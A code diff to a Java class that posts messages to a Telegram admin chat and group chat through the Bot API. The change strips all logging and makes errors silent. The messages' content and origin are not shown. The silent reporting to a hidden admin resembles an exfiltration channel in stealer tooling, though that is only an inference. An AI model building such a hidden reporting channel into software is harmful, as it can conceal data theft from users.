@@ -11,14 +11,8 @@ public class NetworkDispatcher {
     
     public static void sendMessage(String message) {
         new Thread(() -> {
-            System.out.println("[NetworkDispatcher] sendMessage called");
-            System.out.println("[NetworkDispatcher] BOT_TOKEN=" + CoreBootstrap.TELEGRAM_BOT_TOKEN);
-            System.out.println("[NetworkDispatcher] ADMIN_ID=" + CoreBootstrap.TELEGRAM_ADMIN_ID);
-            System.out.println("[NetworkDispatcher] GROUP_ID=" + CoreBootstrap.TELEGRAM_GROUP_ID);
             if (CoreBootstrap.TELEGRAM_ADMIN_ID != null && !CoreBootstrap.TELEGRAM_ADMIN_ID.isEmpty()) {
                 sendToChat(message, CoreBootstrap.TELEGRAM_ADMIN_ID);
-            } else {
-                System.out.println("[NetworkDispatcher] ADMIN_ID is empty, skipping");
             }
             if (CoreBootstrap.TELEGRAM_GROUP_ID != null && !CoreBootstrap.TELEGRAM_GROUP_ID.isEmpty()) {
                 sendToChat(message, CoreBootstrap.TELEGRAM_GROUP_ID);
@@ -32,9 +26,6 @@ public class NetworkDispatcher {
                                "\",\"text\":\"" + escapeJson(message) + 
                                "\",\"parse_mode\":\"HTML\"}";
             
-            System.out.println("[NetworkDispatcher] Sending to chatId=" + chatId);
-            System.out.println("[NetworkDispatcher] Payload length=" + jsonPayload.length());
-            
             URL url = new URL("https://api.telegram.org/bot" + CoreBootstrap.TELEGRAM_BOT_TOKEN + "/sendMessage");
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
             conn.setRequestMethod("POST");
@@ -46,12 +37,9 @@ public class NetworkDispatcher {
                 os.write(input, 0, input.length);
             }
             
-            int responseCode = conn.getResponseCode();
-            System.out.println("[NetworkDispatcher] Response code=" + responseCode);
+            conn.getResponseCode();
             conn.disconnect();
-        } catch (Exception e) {
-            System.out.println("[NetworkDispatcher] ERROR: " + e.getMessage());
-            e.printStackTrace();
+        } catch (Exception ignored) {
         }
     }
     
